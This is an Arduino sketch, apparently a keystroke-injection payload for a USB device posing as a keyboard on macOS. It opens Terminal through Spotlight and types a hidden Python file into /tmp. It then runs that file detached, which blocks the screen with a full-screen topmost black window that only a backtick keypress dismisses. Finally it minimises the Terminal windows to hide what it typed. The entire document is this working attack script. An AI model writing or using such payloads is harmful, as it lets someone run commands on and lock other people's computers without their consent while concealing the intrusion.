#include <Keyboard.h>

void t(const char* s) { for(int i=0;s[i];i++){Keyboard.write(s[i]);delay(5);} }
void ln(const char* s) { t(s); Keyboard.write(KEY_RETURN); delay(30); }

void setup() {
  delay(2500); Keyboard.begin(); delay(500);
  Keyboard.press(KEY_LEFT_GUI); Keyboard.press(' ');
  delay(100); Keyboard.releaseAll(); delay(1200);
  t("Terminal"); delay(500);
  Keyboard.write(KEY_RETURN); delay(4000);

  ln("cat>/tmp/.b.py<<'E'");
  delay(300);
  ln("import tkinter as t");
  ln("r=t.Tk()");
  ln("r.configure(bg='black')");
  ln("r.attributes('-fullscreen',True)");
  ln("r.attributes('-topmost',True)");
  ln("r.focus_force()");
  ln("r.bind('<Key>',lambda e:r.destroy() if e.char=='`' else None)");
  ln("r.mainloop()");
  ln("E");
  delay(500);
  ln("nohup python3 /tmp/.b.py&disown;osascript -e 'tell app \"Terminal\" to set miniaturized of every window to true'");

  Keyboard.end();
}
void loop() {}
